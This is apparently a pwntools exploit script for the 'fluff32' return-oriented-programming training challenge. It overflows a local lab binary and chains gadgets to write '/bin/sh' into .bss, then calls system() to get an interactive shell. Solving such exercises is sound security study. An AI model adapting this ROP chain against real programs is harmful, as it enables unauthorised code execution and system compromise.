from pwn import *

p = process('./fluff32')

system_plt = 0x08048430
bss_addr = 0x0804A040
pop_ebx = 0x080483e1
mov_ecx_edx = 0x08048693
xchg_edx_ecx = 0x08048689
xor_edx_edx = 0x08048671
xor_edx_ebx = 0x0804867b
pad = 'A'*44

def write_data(data,addr):
	# ~ addr --> ecx
	payload = ''
	payload += p32(xor_edx_edx)
	payload += 'AAAA'
	payload += p32(pop_ebx)
	payload += p32(addr)
	payload += p32(xor_edx_ebx)
	payload += 'AAAA'
	payload += p32(xchg_edx_ecx)
	payload += 'AAAA'
	# ~ data --> edx
	payload += p32(xor_edx_edx)
	payload += 'AAAA'
	payload += p32(pop_ebx)
	payload += data
	payload += p32(xor_edx_ebx)
	payload += 'AAAA'
	# ~ edx -->[ecx]
	payload += p32(mov_ecx_edx)
	payload += 'AAAA'
	payload += p32(0)
	
	return payload
	
payload = pad
payload += write_data('/bin',bss_addr)
payload += write_data('/sh\x00',bss_addr+4)
payload += p32(system_plt)
payload += 'AAAA'
payload += p32(bss_addr) 

p.sendline(payload)
p.interactive()